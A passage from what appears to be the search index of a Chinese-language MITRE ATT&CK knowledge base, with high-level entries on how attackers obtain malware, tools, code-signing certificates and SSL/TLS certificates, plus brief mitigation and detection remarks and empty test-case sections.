u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_9","text":"MITRE-ATT&CK-T1588-001 https://attack.mitre.org/techniques/T1588/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/","text":"T1588-002-\u83b7\u53d6\u80fd\u529b-\u5de5\u5177 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u7a83\u53d6\u6216\u4e0b\u8f7d\u53ef\u5728\u653b\u51fb\u76ee\u6807\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u8f6f\u4ef6\u5de5\u5177\u3002\u5de5\u5177\u53ef\u4ee5\u662f\u5f00\u653e\u6216\u95ed\u6e90\u7684\uff0c\u514d\u8d39\u6216\u5546\u4e1a\u7684\u3002\u4e00\u4e2a\u5de5\u5177\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u7528\u4e8e\u6076\u610f\u76ee\u7684\uff0c\u4f46\u5de5\u5177\uff08\u4e0e\u6076\u610f\u8f6f\u4ef6\u4e0d\u540c\uff09\u5e76\u4e0d\u662f\u88ab\u7528\u4e8e\u8fd9\u4e9b\u76ee\u7684\uff08\u4f8b\u5982\uff1aPsExec\uff09\u3002\u5de5\u5177\u7684\u83b7\u53d6\u53ef\u80fd\u6d89\u53ca\u5546\u4e1a\u8f6f\u4ef6\u8bb8\u53ef\u8bc1\u7684\u91c7\u8d2d\uff0c\u5305\u62ecCobalt Strike\u7b49\u7ea2\u8272\u56e2\u961f\u5de5\u5177\u3002\u5546\u4e1a\u8f6f\u4ef6\u53ef\u4ee5\u901a\u8fc7\u8d2d\u4e70\u3001\u76d7\u53d6\u8bb8\u53ef\u8bc1\uff08\u6216\u8f6f\u4ef6\u7684\u8bb8\u53ef\u526f\u672c\uff09\u6216\u7834\u89e3\u8bd5\u7528\u7248\u6765\u83b7\u5f97\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u5de5\u5177\u6765\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u5305\u62ec\u652f\u6301\u6267\u884c\u7834\u574f\u540e\u7684\u884c\u4e3a\u3002\u9664\u4e86\u81ea\u7531\u4e0b\u8f7d\u6216\u8d2d\u4e70\u8f6f\u4ef6\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\uff08\u5305\u62ec\u5176\u4ed6\u653b\u51fb\u8005\uff09\u7a83\u53d6\u8f6f\u4ef6\u6216\u8f6f\u4ef6\u8bb8\u53ef\u8bc1\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u8005\u751f\u547d\u5468\u671f\u7684\u59a5\u534f\u540e\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1588-002 https://attack.mitre.org/techniques/T1588/002/","title":"T1588-002-\u83b7\u53d6\u80fd\u529b-\u5de5\u5177"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#t1588-002-","text":"","title":"T1588-002-\u83b7\u53d6\u80fd\u529b-\u5de5\u5177"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u7a83\u53d6\u6216\u4e0b\u8f7d\u53ef\u5728\u653b\u51fb\u76ee\u6807\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u8f6f\u4ef6\u5de5\u5177\u3002\u5de5\u5177\u53ef\u4ee5\u662f\u5f00\u653e\u6216\u95ed\u6e90\u7684\uff0c\u514d\u8d39\u6216\u5546\u4e1a\u7684\u3002\u4e00\u4e2a\u5de5\u5177\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u7528\u4e8e\u6076\u610f\u76ee\u7684\uff0c\u4f46\u5de5\u5177\uff08\u4e0e\u6076\u610f\u8f6f\u4ef6\u4e0d\u540c\uff09\u5e76\u4e0d\u662f\u88ab\u7528\u4e8e\u8fd9\u4e9b\u76ee\u7684\uff08\u4f8b\u5982\uff1aPsExec\uff09\u3002\u5de5\u5177\u7684\u83b7\u53d6\u53ef\u80fd\u6d89\u53ca\u5546\u4e1a\u8f6f\u4ef6\u8bb8\u53ef\u8bc1\u7684\u91c7\u8d2d\uff0c\u5305\u62ecCobalt Strike\u7b49\u7ea2\u8272\u56e2\u961f\u5de5\u5177\u3002\u5546\u4e1a\u8f6f\u4ef6\u53ef\u4ee5\u901a\u8fc7\u8d2d\u4e70\u3001\u76d7\u53d6\u8bb8\u53ef\u8bc1\uff08\u6216\u8f6f\u4ef6\u7684\u8bb8\u53ef\u526f\u672c\uff09\u6216\u7834\u89e3\u8bd5\u7528\u7248\u6765\u83b7\u5f97\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u5de5\u5177\u6765\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u5305\u62ec\u652f\u6301\u6267\u884c\u7834\u574f\u540e\u7684\u884c\u4e3a\u3002\u9664\u4e86\u81ea\u7531\u4e0b\u8f7d\u6216\u8d2d\u4e70\u8f6f\u4ef6\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\uff08\u5305\u62ec\u5176\u4ed6\u653b\u51fb\u8005\uff09\u7a83\u53d6\u8f6f\u4ef6\u6216\u8f6f\u4ef6\u8bb8\u53ef\u8bc1\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_8","text":"\u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u8005\u751f\u547d\u5468\u671f\u7684\u59a5\u534f\u540e\u9636\u6bb5\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-002-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E5%B7%A5%E5%85%B7/#_9","text":"MITRE-ATT&CK-T1588-002 https://attack.mitre.org/techniques/T1588/002/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/","text":"T1588-003-\u83b7\u53d6\u80fd\u529b-\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u6216\u7a83\u53d6\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66\uff0c\u4ee5\u4fbf\u5728\u653b\u51fb\u76ee\u6807\u4e2d\u4f7f\u7528\u3002\u4ee3\u7801\u7b7e\u540d\u662f\u5bf9\u53ef\u6267\u884c\u6587\u4ef6\u548c\u811a\u672c\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u7684\u8fc7\u7a0b\uff0c\u4ee5\u786e\u8ba4\u8f6f\u4ef6\u7684\u4f5c\u8005\u5e76\u4fdd\u8bc1\u4ee3\u7801\u6ca1\u6709\u88ab\u6539\u53d8\u6216\u7834\u574f\u3002\u4ee3\u7801\u7b7e\u540d\u4e3a\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\u63d0\u4f9b\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u7684\u771f\u5b9e\u6027\uff0c\u5e76\u4fdd\u8bc1\u7a0b\u5e8f\u6ca1\u6709\u88ab\u7be1\u6539\u3002\u7528\u6237\u548c\u5b89\u5168\u5de5\u5177\u53ef\u80fd\u6bd4\u672a\u7b7e\u540d\u7684\u4ee3\u7801\u66f4\u4fe1\u4efb\u5df2\u7b7e\u540d\u7684\u4ee3\u7801\uff0c\u5373\u4f7f\u4ed6\u4eec\u4e0d\u77e5\u9053\u8c01\u9881\u53d1\u4e86\u8bc1\u4e66\u6216\u8c01\u662f\u4f5c\u8005\u3002 \u5728\u4ee3\u7801\u7b7e\u540d\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u6216\u7a83\u53d6\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66\u7528\u4e8e\u64cd\u4f5c\u3002\u8d2d\u4e70\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u5e4c\u5b50\u7ec4\u7ec7\uff0c\u6216\u4f7f\u7528\u4ece\u4ee5\u524d\u88ab\u653b\u7834\u7684\u5b9e\u4f53\u4e2d\u7a83\u53d6\u7684\u4fe1\u606f\uff0c\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u4ee5\u8be5\u5b9e\u4f53\u7684\u8eab\u4efd\u5411\u8bc1\u4e66\u63d0\u4f9b\u5546\u9a8c\u8bc1\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4ece\u88ab\u653b\u51fb\u7684\u7b2c\u4e09\u65b9\u90a3\u91cc\u7a83\u53d6\u4ee3\u7801\u7b7e\u540d\u6750\u6599\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c6\u8303\u56f4\u4e4b\u5916\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u76f8\u5173\u7684\u540e\u7eed\u884c\u4e3a\u4e0a\uff0c\u5982\u4ee3\u7801\u7b7e\u540d\u6216\u5b89\u88c5\u6839\u8bc1\u4e66\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1588-003 https://attack.mitre.org/techniques/T1588/003/","title":"T1588-003-\u83b7\u53d6\u80fd\u529b-\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#t1588-003-","text":"","title":"T1588-003-\u83b7\u53d6\u80fd\u529b-\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u6216\u7a83\u53d6\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66\uff0c\u4ee5\u4fbf\u5728\u653b\u51fb\u76ee\u6807\u4e2d\u4f7f\u7528\u3002\u4ee3\u7801\u7b7e\u540d\u662f\u5bf9\u53ef\u6267\u884c\u6587\u4ef6\u548c\u811a\u672c\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u7684\u8fc7\u7a0b\uff0c\u4ee5\u786e\u8ba4\u8f6f\u4ef6\u7684\u4f5c\u8005\u5e76\u4fdd\u8bc1\u4ee3\u7801\u6ca1\u6709\u88ab\u6539\u53d8\u6216\u7834\u574f\u3002\u4ee3\u7801\u7b7e\u540d\u4e3a\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\u63d0\u4f9b\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u7684\u771f\u5b9e\u6027\uff0c\u5e76\u4fdd\u8bc1\u7a0b\u5e8f\u6ca1\u6709\u88ab\u7be1\u6539\u3002\u7528\u6237\u548c\u5b89\u5168\u5de5\u5177\u53ef\u80fd\u6bd4\u672a\u7b7e\u540d\u7684\u4ee3\u7801\u66f4\u4fe1\u4efb\u5df2\u7b7e\u540d\u7684\u4ee3\u7801\uff0c\u5373\u4f7f\u4ed6\u4eec\u4e0d\u77e5\u9053\u8c01\u9881\u53d1\u4e86\u8bc1\u4e66\u6216\u8c01\u662f\u4f5c\u8005\u3002 \u5728\u4ee3\u7801\u7b7e\u540d\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u6216\u7a83\u53d6\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66\u7528\u4e8e\u64cd\u4f5c\u3002\u8d2d\u4e70\u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u5e4c\u5b50\u7ec4\u7ec7\uff0c\u6216\u4f7f\u7528\u4ece\u4ee5\u524d\u88ab\u653b\u7834\u7684\u5b9e\u4f53\u4e2d\u7a83\u53d6\u7684\u4fe1\u606f\uff0c\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u4ee5\u8be5\u5b9e\u4f53\u7684\u8eab\u4efd\u5411\u8bc1\u4e66\u63d0\u4f9b\u5546\u9a8c\u8bc1\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4ece\u88ab\u653b\u51fb\u7684\u7b2c\u4e09\u65b9\u90a3\u91cc\u7a83\u53d6\u4ee3\u7801\u7b7e\u540d\u6750\u6599\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c6\u8303\u56f4\u4e4b\u5916\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u76f8\u5173\u7684\u540e\u7eed\u884c\u4e3a\u4e0a\uff0c\u5982\u4ee3\u7801\u7b7e\u540d\u6216\u5b89\u88c5\u6839\u8bc1\u4e66\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-003-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/#_9","text":"MITRE-ATT&CK-T1588-003 https://attack.mitre.org/techniques/T1588/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/","text":"T1588-004-\u83b7\u53d6\u80fd\u529b-\u6570\u5b57\u8bc1\u4e66 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u548c\u7a83\u53d6SSL/TLS\u8bc1\u4e66\uff0c\u4ee5\u4fbf\u5728\u653b\u51fb\u76ee\u6807\u4e2d\u4f7f\u7528\u3002SSL/TLS\u8bc1\u4e66\u662f\u4e3a\u4e86\u704c\u8f93\u4fe1\u4efb\u3002\u5b83\u4eec\u5305\u62ec\u5173\u4e8e\u5bc6\u94a5\u7684\u4fe1\u606f\uff0c\u5173\u4e8e\u5176\u6240\u6709\u8005\u8eab\u4efd\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u4e00\u4e2a\u5b9e\u4f53\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u8be5\u5b9e\u4f53\u5df2\u7ecf\u9a8c\u8bc1\u4e86\u8bc1\u4e66\u7684\u5185\u5bb9\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u7b7e\u540d\u662f\u6709\u6548\u7684\uff0c\u5e76\u4e14\u68c0\u67e5\u8bc1\u4e66\u7684\u4eba\u4fe1\u4efb\u7b7e\u540d\u8005\uff0c\u90a3\u4e48\u4ed6\u4eec\u5c31\u77e5\u9053\u53ef\u4ee5\u4f7f\u7528\u8be5\u94a5\u5319\u4e0e\u8bc1\u4e66\u6240\u6709\u8005\u8fdb\u884c\u901a\u4fe1\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u6216\u7a83\u53d6SSL/TLS\u8bc1\u4e66\uff0c\u4ee5\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u5982\u52a0\u5bc6C2\u6d41\u91cf\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u534f\u8bae\u7684\u975e\u5bf9\u79f0\u52a0\u5bc6\u6cd5\uff09\uff0c\u751a\u81f3\u542f\u7528\u4e2d\u95f4\u4eba\uff0c\u5982\u679c\u8bc1\u4e66\u88ab\u4fe1\u4efb\u6216\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6dfb\u52a0\u5230\u4fe1\u4efb\u6839\uff08\u5373\u5b89\u88c5\u6839\u8bc1\u4e66\uff09\u3002\u6570\u5b57\u8bc1\u4e66\u7684\u8d2d\u4e70\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u5e4c\u5b50\u7ec4\u7ec7\uff0c\u6216\u4f7f\u7528\u4ece\u4ee5\u524d\u88ab\u653b\u7834\u7684\u5b9e\u4f53\u4e2d\u7a83\u53d6\u7684\u4fe1\u606f\uff0c\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u4ee5\u8be5\u5b9e\u4f53\u7684\u8eab\u4efd\u5411\u8bc1\u4e66\u63d0\u4f9b\u8005\u9a8c\u8bc1\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4ece\u88ab\u653b\u51fb\u7684\u7b2c\u4e09\u65b9\u90a3\u91cc\u7a83\u53d6\u8bc1\u4e66\u6750\u6599\uff0c\u5305\u62ec\u4ece\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u90a3\u91cc\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6ce8\u518c\u6216\u52ab\u6301\u4ed6\u4eec\u4ee5\u540e\u8981\u8d2d\u4e70SSL/TLS\u8bc1\u4e66\u7684\u57df\u540d\u3002 \u6709\u4e00\u4e9b\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u5141\u8bb8\u653b\u51fb\u8005\u514d\u8d39\u83b7\u5f97SSL/TLS\u8bc1\u4e66\uff0c\u5982\u57df\u540d\u9a8c\u8bc1\u8bc1\u4e66\u3002 \u83b7\u5f97\u6570\u5b57\u8bc1\u4e66\u540e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5176\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\u5b89\u88c5\u8be5\u8bc1\u4e66\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u65b0\u9881\u53d1\u7684\u8bc1\u4e66\u6216\u4e92\u8054\u7f51\u4e0a\u7684\u7f51\u7ad9\u4f7f\u7528\u7684\u8bc1\u4e66\u7684\u670d\u52a1\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u901a\u8fc7\u5df2\u77e5\u7684\u8bc1\u4e66\u4fe1\u606f\u6765\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u8005\u7684\u57fa\u7840\u8bbe\u65bd\u3002\u653b\u51fb\u8005\u5de5\u5177\u7684\u4e00\u4e9b\u670d\u52a1\u5668\u7aef\u7ec4\u4ef6\u53ef\u80fd\u4e3aSSL/TLS\u8bc1\u4e66\u8bbe\u7f6e\u4e86\u9ed8\u8ba4\u503c\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u76f8\u5173\u884c\u4e3a\u4e0a\uff0c\u5982\u7f51\u7edc\u534f\u8bae\u3001\u975e\u5bf9\u79f0\u52a0\u5bc6\u6216\u5b89\u88c5\u6839\u8bc1\u4e66\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1588-004 